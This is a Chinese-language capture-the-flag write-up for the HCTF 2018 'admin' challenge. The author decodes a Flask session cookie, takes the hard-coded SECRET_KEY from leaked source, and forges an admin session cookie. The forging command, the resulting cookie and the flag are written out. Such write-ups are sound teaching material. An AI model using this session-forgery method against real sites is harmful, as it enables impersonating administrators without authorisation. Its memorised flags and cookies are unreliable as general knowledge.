# admin

[题目地址](https://buuoj.cn/challenges#[HCTF%202018]admin)

没flask拿不了flag，心想着[wp](https://www.anquanke.com/post/id/164086)看都看了写篇笔记吧。（来自未来的我，打比赛不得不装了个flask，现在能做了）

进来有两个页面，login和register。随便注册一个用户，检查源代码时发现提示。

```html
<h1 class="nav">Hello a</h1>


<!-- you are not admin -->
<h1 class="nav">Welcome to hctf</h1>
```

那就是要登录成admin？试了一下sql，没有。在打web题时不要放过任何一个页面，所以改密码的地方也要看看。发现意外收获。

```html
<div class="ui grid">
    <div class="four wide column"></div>
    <div class="eight wide column">
        <!-- https://github.com/woadsl1234/hctf_flask/ -->
      <form class="ui form segment" method="post" enctype="multipart/form-data">
        <div class="field required">
          <label>NewPassword</label>
          <input id="newpassword" name="newpassword" required type="password" value="">
        </div>
        <input type="submit" class="ui button fluid" value="更换密码">
      </form>
    </div>
  </div> 
```

是网站的源代码库。看下代码，没什么直接问题，因为这题的关键根本就不在代码上。在cookie中可以发现session，用脚本解码。

```python
import zlib
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

SESSION=".eJxFkEGLwjAQhf_KMuceTNXDCh66VEoXMqUlISSX0m2rSdq40CpqxP--0YXd0xzee9-bmTvU-6mfNWxO07mPoDYdbO7w9gUbUFl-KdJqpFlJCpYQmnYGM9RU7GLFSoK204XgK2nboO1i6dsrjfMFikpTpkfq8jVlo5EOB3RKF6mMkVVGpeUK2eAp48_MUtlPq-zOo8s9-tCTPb3lkgpO0H8MRaqt9PKCKSfSj4b6Ya2sHlCokOusEnQLjwjaedrXp--hP_6dECwmrHiTlsfoyoDnKxR5rCwnlIU6ywOq9UUmb2Fe0SZrPGxfOOOaQ_9P4u8lS36VY-OCAA1EcJ776fUzIAt4_ABA2Wut.Y2_wxg.QZ975-FH1ABPpJSzTCUopoZ_Hk8"
def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                        'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                            'decoding the payload')

    return session_json_serializer.loads(payload)


if __name__ == '__main__':
    print(decryption(SESSION.encode()))
```

得到seesion内容`{'_fresh': True, '_id': b'db084e0d590507b4ca1a6e4567a9e8b75016c713b45da18e2b919bbcd6fa86654bd48593156c77f2cf136b37050fa8471e570d88cc60455c9b399f8d5fcf7cec', 'csrf_token': b'5fb9e2b566d37585b6f55123659f738f2f716096', 'image': b'5OPL', 'name': 'a', 'user_id': '10'}`。继续查看网站模板，发现登录成admin确实是我们的目标，能看见flag。

```html
{% include('header.html') %}
{% if current_user.is_authenticated %}
<h1 class="nav">Hello {{ session['name'] }}</h1>
{% endif %}
{% if current_user.is_authenticated and session['name'] == 'admin' %}
<h1 class="nav">hctf{xxxxxxxxx}</h1>
{% endif %}
<!-- you are not admin -->
<h1 class="nav">Welcome to hctf</h1>

{% include('footer.html') %}
```

利用seesion什么的绕登录验证也很常见，我们可不可以把自己的sessino改成admin登陆？当然可以，借用大佬的[仓库](https://github.com/noraj/flask-session-cookie-manager)编辑session。编辑时发现需要SECRET_KEY，源代码给了。

```python
import os

class Config(object):
    SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
    SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test'
    SQLALCHEMY_TRACK_MODIFICATIONS = True
```

用python3生成session后赋值即成为管理员，拿到flag。关于session还有另一篇很好的[文章](https://www.leavesongs.com/PENETRATION/client-session-security.html)。

- python3 /Applications/Work/Codes/python/flask-session/session-encode.py encode -s "ckj123" -t "{'_fresh': True, '_id': b'db084e0d590507b4ca1a6e4567a9e8b75016c713b45da18e2b919bbcd6fa86654bd48593156c77f2cf136b37050fa8471e570d88cc60455c9b399f8d5fcf7cec', 'csrf_token': b'5fb9e2b566d37585b6f55123659f738f2f716096', 'image': b'5OPL', 'name': 'admin', 'user_id': '10'}"
> .eJxFkEGLwjAQhf_KMuceTNXDFjx0qZQuZEpLQkguxW2rSdq40CpqxP--0YXd0xzee9-bmTs0-6mfNSSn6dxH0JgOkju8fUECKi8uZVaPNK9IyVJCs85gjpqKbaxYRdB2uhR8JW0btG0sfXulcbFAUWvK9EhdsaZsNNLhgE7pMpMxstqorFohGzxl_JlZKvtpld16dIVHH3ryp7daUsEJ-o-hzLSVXl4w40T60VA_rJXVAwoVcp1Vgm7gEUE7T_vm9D30x78TgsWEFW_S8hhdFfB8haKIleWEslBneUC1vszlLcwr2nSNh80LZ9zu0P-T-HvF0l_luHNBgF3nzBEiOM_99PobkAU8fgD8d21V.Y2_xyQ.Oyc5W21bxItPFXo6yjSyrQNmhlM

更改session后刷新拿到flag。

## Flag
> flag{2417cdd3-06d0-4030-84a7-bce93ed40c04}